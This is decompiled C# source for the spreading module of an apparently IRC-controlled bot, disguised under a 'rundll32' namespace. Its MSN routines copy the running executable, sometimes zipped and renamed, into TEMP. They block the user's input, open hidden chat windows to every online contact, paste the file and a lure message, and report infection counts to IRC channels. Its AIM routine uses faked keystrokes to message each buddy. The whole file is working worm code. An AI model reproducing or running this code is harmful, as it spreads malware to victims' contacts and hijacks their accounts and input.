using System;
using System.Collections.Specialized;
using System.IO;
using System.IO.Compression;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using MSNMessengerAPI;

namespace rundll32.spreaders;

internal class im
{
	internal class msn
	{
		private const int SW_HIDE = 0;

		private const int WM_KEYDOWN = 256;

		private const int WM_CHAR = 258;

		private static irc _irc;

		private static string _msg;

		private static string _filename;

		private static string _zipname;

		private static Thread t;

		[DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		private static extern bool BlockInput([In][MarshalAs(UnmanagedType.Bool)] bool fBlockIt);

		[DllImport("user32.dll")]
		private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

		[DllImport("user32.dll", SetLastError = true)]
		private static extern IntPtr FindWindowEx(IntPtr parentHandle, IntPtr childAfter, string className, IntPtr windowTitle);

		[DllImport("user32.dll", SetLastError = true)]
		private static extern bool PostMessage(IntPtr hWnd, uint Msg, uint wParam, uint lParam);

		[DllImport("user32.dll")]
		[return: MarshalAs(UnmanagedType.Bool)]
		private static extern bool SetForegroundWindow(IntPtr hWnd);

		public static void sendMsg(irc irc, string msg)
		{
			try
			{
				t.Abort();
			}
			catch
			{
			}
			_irc = irc;
			_msg = msg;
			t = new Thread(sendMsgThread);
			t.Start();
		}

		public static void sendFile(irc irc, string msg, string filename)
		{
			try
			{
				t.Abort();
			}
			catch
			{
			}
			_irc = irc;
			_msg = msg;
			_filename = filename;
			t = new Thread(sendFileThread);
			t.Start();
		}

		public static void sendZipFile(irc irc, string msg, string zipname, string filename)
		{
			try
			{
				t.Abort();
			}
			catch
			{
			}
			_irc = irc;
			_msg = msg;
			_zipname = zipname;
			_filename = filename;
			t = new Thread(sendZipFileThread);
			t.Start();
		}

		private static void sendMsgThread()
		{
			//IL_0002: Unknown result type (might be due to invalid IL or missing references)
			//IL_0008: Expected O, but got Unknown
			//IL_000e: Unknown result type (might be due to invalid IL or missing references)
			//IL_0027: Unknown result type (might be due to invalid IL or missing references)
			//IL_002d: Expected O, but got Unknown
			//IL_002e: Unknown result type (might be due to invalid IL or missing references)
			//IL_0034: Invalid comparison between Unknown and I4
			//IL_0047: Unknown result type (might be due to invalid IL or missing references)
			//IL_004d: Expected O, but got Unknown
			int num = 0;
			try
			{
				Messenger val = (Messenger)new MessengerClass();
				foreach (IMSNMessengerContact item in (IMSNMessengerContacts)((IMSNMessenger3)val).get_MyContacts())
				{
					IMSNMessengerContact val2 = item;
					if ((int)val2.get_Status() != 1)
					{
						BlockInput(fBlockIt: true);
						IMSNMessengerWindow val3 = (IMSNMessengerWindow)((IMSNMessenger3)val).InstantMessage((object)val2);
						ShowWindow((IntPtr)val3.get_HWND(), 0);
						IntPtr parentHandle = FindWindowEx((IntPtr)val3.get_HWND(), IntPtr.Zero, "IM Window Class", IntPtr.Zero);
						IntPtr hWnd = FindWindowEx(parentHandle, IntPtr.Zero, "DirectUIHWND", IntPtr.Zero);
						string msg = _msg;
						foreach (char c in msg)
						{
							int num2 = c;
							uint wParam = Convert.ToUInt32(num2.ToString().ToUpper());
							PostMessage(hWnd, 258u, wParam, 2097153u);
						}
						PostMessage(hWnd, 256u, 13u, 2097153u);
						num++;
						val3.Close();
						BlockInput(fBlockIt: false);
						Thread.Sleep(config.im_msn_interval);
					}
				}
			}
			catch
			{
				BlockInput(fBlockIt: false);
			}
			string[][] onConnChannels = config.onConnChannels;
			foreach (string[] array in onConnChannels)
			{
				if (num != 0)
				{
					_irc.sendMessage(array[0], ".:MSN:. - \u000308Sent message to \u000309" + num + "\u000308 people!");
				}
			}
		}

		private static void sendFileThread()
		{
			//IL_00ae: Unknown result type (might be due to invalid IL or missing references)
			//IL_00b4: Expected O, but got Unknown
			//IL_00ba: Unknown result type (might be due to invalid IL or missing references)
			//IL_00d3: Unknown result type (might be due to invalid IL or missing references)
			//IL_00d9: Expected O, but got Unknown
			//IL_00da: Unknown result type (might be due to invalid IL or missing references)
			//IL_00e0: Invalid comparison between Unknown and I4
			//IL_00f3: Unknown result type (might be due to invalid IL or missing references)
			//IL_00fa: Expected O, but got Unknown
			int num = 0;
			try
			{
				if (!_filename.Contains("."))
				{
					_filename += ".exe";
				}
				if (File.Exists(Environment.GetEnvironmentVariable("TEMP") + "\\" + _filename))
				{
					File.Delete(Environment.GetEnvironmentVariable("TEMP") + "\\" + _filename);
				}
				File.Copy(Application.get_ExecutablePath(), Environment.GetEnvironmentVariable("TEMP") + "\\" + _filename);
				StringCollection stringCollection = new StringCollection();
				stringCollection.Add(Environment.GetEnvironmentVariable("TEMP") + "\\" + _filename);
				Messenger val = (Messenger)new MessengerClass();
				foreach (IMSNMessengerContact item in (IMSNMessengerContacts)((IMSNMessenger3)val).get_MyContacts())
				{
					IMSNMessengerContact val2 = item;
					if ((int)val2.get_Status() != 1)
					{
						BlockInput(fBlockIt: true);
						IMSNMessengerWindow val3 = (IMSNMessengerWindow)((IMSNMessenger3)val).InstantMessage((object)val2);
						ShowWindow((IntPtr)val3.get_HWND(), 1);
						IntPtr parentHandle = FindWindowEx((IntPtr)val3.get_HWND(), IntPtr.Zero, "IM Window Class", IntPtr.Zero);
						IntPtr hWnd = FindWindowEx(parentHandle, IntPtr.Zero, "DirectUIHWND", IntPtr.Zero);
						SetForegroundWindow((IntPtr)val3.get_HWND());
						Clipboard.SetFileDropList(stringCollection);
						SendKeys.SendWait("^v");
						Thread.Sleep(200);
						SendKeys.SendWait("{TAB}");
						SendKeys.SendWait("{ENTER}");
						num++;
						string msg = _msg;
						foreach (char c in msg)
						{
							int num2 = c;
							uint wParam = Convert.ToUInt32(num2.ToString().ToUpper());
							PostMessage(hWnd, 258u, wParam, 0u);
						}
						PostMessage(hWnd, 256u, 13u, 0u);
						ShowWindow((IntPtr)val3.get_HWND(), 0);
						BlockInput(fBlockIt: false);
					}
				}
			}
			catch
			{
				BlockInput(fBlockIt: false);
			}
			string[][] onConnChannels = config.onConnChannels;
			foreach (string[] array in onConnChannels)
			{
				if (num != 0)
				{
					_irc.sendMessage(array[0], ".:MSN:. - \u000308Sent file to \u000309" + num + "\u000308 people!");
				}
			}
		}

		private static void sendZipFileThread()
		{
			//IL_00f6: Unknown result type (might be due to invalid IL or missing references)
			//IL_00fd: Expected O, but got Unknown
			//IL_0104: Unknown result type (might be due to invalid IL or missing references)
			//IL_011d: Unknown result type (might be due to invalid IL or missing references)
			//IL_0124: Expected O, but got Unknown
			//IL_0126: Unknown result type (might be due to invalid IL or missing references)
			//IL_012c: Invalid comparison between Unknown and I4
			//IL_0141: Unknown result type (might be due to invalid IL or missing references)
			//IL_0148: Expected O, but got Unknown
			int num = 0;
			try
			{
				if (!_zipname.Contains("."))
				{
					_zipname += ".zip";
				}
				if (!_filename.Contains("."))
				{
					_filename += ".exe";
				}
				if (File.Exists(Environment.GetEnvironmentVariable("TEMP") + "\\" + _zipname))
				{
					File.Delete(Environment.GetEnvironmentVariable("TEMP") + "\\" + _zipname);
				}
				string executablePath = Application.get_ExecutablePath();
				string filename = Environment.GetEnvironmentVariable("TEMP") + "\\" + _zipname;
				ZipStorer zipStorer = ZipStorer.Create(filename, "");
				zipStorer.AddFile(ZipStorer.Compression.Deflate, executablePath, _filename, "");
				zipStorer.Close();
				StringCollection stringCollection = new StringCollection();
				stringCollection.Add(Environment.GetEnvironmentVariable("TEMP") + "\\" + _zipname);
				IMSNMessenger3 val = (IMSNMessenger3)new MessengerClass();
				foreach (IMSNMessengerContact item in (IMSNMessengerContacts)val.get_MyContacts())
				{
					IMSNMessengerContact val2 = item;
					if ((int)val2.get_Status() != 1)
					{
						BlockInput(fBlockIt: true);
						IMSNMessengerWindow val3 = (IMSNMessengerWindow)val.InstantMessage((object)val2);
						ShowWindow((IntPtr)val3.get_HWND(), 1);
						IntPtr parentHandle = FindWindowEx((IntPtr)val3.get_HWND(), IntPtr.Zero, "IM Window Class", IntPtr.Zero);
						IntPtr hWnd = FindWindowEx(parentHandle, IntPtr.Zero, "DirectUIHWND", IntPtr.Zero);
						SetForegroundWindow((IntPtr)val3.get_HWND());
						Clipboard.SetFileDropList(stringCollection);
						SendKeys.SendWait("^v");
						Thread.Sleep(200);
						SendKeys.SendWait("{TAB}");
						SendKeys.SendWait("{ENTER}");
						num++;
						string msg = _msg;
						foreach (char c in msg)
						{
							int num2 = c;
							uint wParam = Convert.ToUInt32(num2.ToString().ToUpper());
							PostMessage(hWnd, 258u, wParam, 0u);
						}
						PostMessage(hWnd, 256u, 13u, 0u);
						ShowWindow((IntPtr)val3.get_HWND(), 0);
						BlockInput(fBlockIt: false);
					}
				}
			}
			catch
			{
				BlockInput(fBlockIt: false);
			}
			string[][] onConnChannels = config.onConnChannels;
			foreach (string[] array in onConnChannels)
			{
				if (num != 0)
				{
					_irc.sendMessage(array[0], ".:MSN:. - \u000308Sent zipfile to \u000309" + num + "\u000308 people!");
				}
			}
		}
	}

	internal class aim
	{
		private const int WM_CLOSE = 16;

		private const int WM_SYSKEYDOWN = 260;

		private const int WM_SYSKEYUP = 261;

		private const int KEYEVENTF_EXTENDEDKEY = 1;

		private const int KEYEVENTF_KEYUP = 2;

		private const int VK_ESCAPE = 27;

		private const int VK_HOME = 36;

		private const int VK_LEFT = 37;

		private const int VK_UP = 38;

		private const int VK_RIGHT = 39;

		private const int VK_DOWN = 40;

		private const int VK_MENU = 18;

		private const int VK_RETURN = 13;

		private const int VK_CONTROL = 17;

		private const int VK_TAB = 9;

		private const int VK_LSHIFT = 160;

		private const int VK_END = 35;

		private static string _msg = "";

		private static irc _irc = null;

		private static Thread t = null;

		[DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		private static extern bool BlockInput([In][MarshalAs(UnmanagedType.Bool)] bool fBlockIt);

		[DllImport("user32.dll", SetLastError = true)]
		private static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

		[DllImport("user32.dll")]
		[return: MarshalAs(UnmanagedType.Bool)]
		private static extern bool IsWindow(IntPtr hWnd);

		[DllImport("user32.dll", CharSet = CharSet.Auto)]
		private static extern IntPtr SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);

		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern int GetWindowTextLength(IntPtr hWnd);

		[DllImport("user32.dll", SetLastError = true)]
		private static extern IntPtr FindWindowEx(IntPtr hwndParent, IntPtr hwndChildAfter, string lpszClass, string lpszWindow);

		[DllImport("user32.dll")]
		[return: MarshalAs(UnmanagedType.Bool)]
		private static extern bool SetForegroundWindow(IntPtr hWnd);

		[DllImport("user32.dll")]
		private static extern void keybd_event(int bVk, int bScan, int dwFlags, int dwExtraInfo);

		[DllImport("user32.dll")]
		private static extern short VkKeyScan(char ch);

		private static string GetText(IntPtr hWnd)
		{
			int windowTextLength = GetWindowTextLength(hWnd);
			StringBuilder stringBuilder = new StringBuilder(windowTextLength + 1);
			GetWindowText(hWnd, stringBuilder, stringBuilder.Capacity);
			return stringBuilder.ToString();
		}

		public static void sendMsg(irc irc, string msg)
		{
			try
			{
				t.Abort();
			}
			catch
			{
			}
			_irc = irc;
			_msg = msg;
			t = new Thread(sendMsgThread);
			t.Start();
		}

		public static void sendMsgThread()
		{
			int num = 0;
			IntPtr hWnd = FindWindow("imAppSystemTrayHandler", "imApp");
			IntPtr zero = IntPtr.Zero;
			IntPtr intPtr = IntPtr.Zero;
			IntPtr zero2 = IntPtr.Zero;
			string text = null;
			string text2 = null;
			bool flag = false;
			if (IsWindow(hWnd))
			{
				SendMessage(hWnd, 101, 321, 515);
				int num2 = 0;
				num2 = 1;
				int num3 = 1;
				while (true)
				{
					IL_00ad:
					zero = FindWindow("__oxFrame.class__", "AIM (Available)");
					while (!IsWindow(zero))
					{
						num2++;
						switch (num2)
						{
						case 2:
							zero = FindWindow("__oxFrame.class__", "AIM (Away)");
							continue;
						case 3:
							zero = FindWindow("__oxFrame.class__", "AIM (Mobile)");
							continue;
						case 4:
							num2 = 0;
							continue;
						default:
							continue;
						case 1:
							break;
						}
						goto IL_00ad;
					}
					break;
				}
				do
				{
					intPtr = FindWindowEx(IntPtr.Zero, intPtr, "__oxFrame.class__", null);
					text = GetText(intPtr);
					if (text != "AIM")
					{
						SendMessage(intPtr, 16, 0, 0);
					}
				}
				while (IsWindow(intPtr));
				TritonSetupList(zero);
				while (!flag)
				{
					SetForegroundWindow(zero);
					Thread.Sleep(250);
					SysKey(zero, 40, 1);
					SysKey(zero, 13, 1);
					zero2 = IntPtr.Zero;
					do
					{
						zero2 = FindWindowEx(IntPtr.Zero, zero2, "__oxFrame.class__", null);
						if (!IsWindow(zero2))
						{
							continue;
						}
						text = GetText(zero2);
						if (text.StartsWith("IM"))
						{
							if (text == text2)
							{
								flag = true;
							}
							else
							{
								text2 = text;
								SetForegroundWindow(zero2);
								TritonIm(zero2, _msg);
								num++;
							}
							SendMessage(zero2, 16, 0, 0);
						}
					}
					while (IsWindow(zero2));
				}
				TritonSetupList(zero);
			}
			string[][] onConnChannels = config.onConnChannels;
			foreach (string[] array in onConnChannels)
			{
				if (num != 0)
				{
					_irc.sendMessage(array[0], ".:AIM:. - \u000308Sent message to \u000309" + num + "\u000308 people!");
				}
			}
		}

		private static void TritonIm(IntPtr hWindow, string msg)
		{
			IntPtr intPtr = IntPtr.Zero;
			for (int i = 0; i < msg.Length; i++)
			{
				if (msg[i] == '[')
				{
					keybd_event(17, 0, 0, 0);
					short num = VkKeyScan('l');
					keybd_event((ushort)num, 0, 0, 0);
					keybd_event((ushort)num, 0, 2, 0);
					keybd_event(17, 0, 2, 0);
					while (!IsWindow(intPtr))
					{
						intPtr = FindWindowEx(IntPtr.Zero, intPtr, "__oxFrame.class__", "Edit Hyperlink");
					}
					SetForegroundWindow(intPtr);
					continue;
				}
				if (msg[i] == '*')
				{
					HitKey(9, 1);
					continue;
				}
				if (msg[i] == ']')
				{
					HitKey(9, 1);
					HitKey(13, 1);
					Thread.Sleep(250);
					SetForegroundWindow(hWindow);
					continue;
				}
				short bVk = VkKeyScan(msg[i]);
				if (char.IsUpper(msg[i]))
				{
					keybd_event(160, 0, 0, 0);
				}
				keybd_event(bVk, 0, 0, 0);
				keybd_event(bVk, 0, 2, 0);
				if (char.IsUpper(msg[i]))
				{
					keybd_event(160, 0, 2, 0);
				}
			}
			SetForegroundWindow(hWindow);
			HitKey(13, 1);
			Thread.Sleep(250);
		}

		private static bool TritonSetupList(IntPtr hBuddyList)
		{
			SetForegroundWindow(hBuddyList);
			Thread.Sleep(250);
			SysKey(hBuddyList, 27, 2);
			SysKey(hBuddyList, 36, 1);
			SysKey(hBuddyList, 39, 1);
			SysKey(hBuddyList, 35, 1);
			SysKey(hBuddyList, 39, 1);
			SysKey(hBuddyList, 36, 1);
			return true;
		}

		private static void SysKey(IntPtr hWindow, int wKey, int iTimes)
		{
			for (int i = 0; i < iTimes; i++)
			{
				SendMessage(hWindow, 260, wKey, 0);
				SendMessage(hWindow, 261, wKey, 0);
			}
		}

		private static void HitKey(int cKey, int iTimes)
		{
			for (int i = 0; i < iTimes; i++)
			{
				keybd_event(cKey, 0, 0, 0);
				keybd_event(cKey, 0, 2, 0);
			}
		}
	}
}
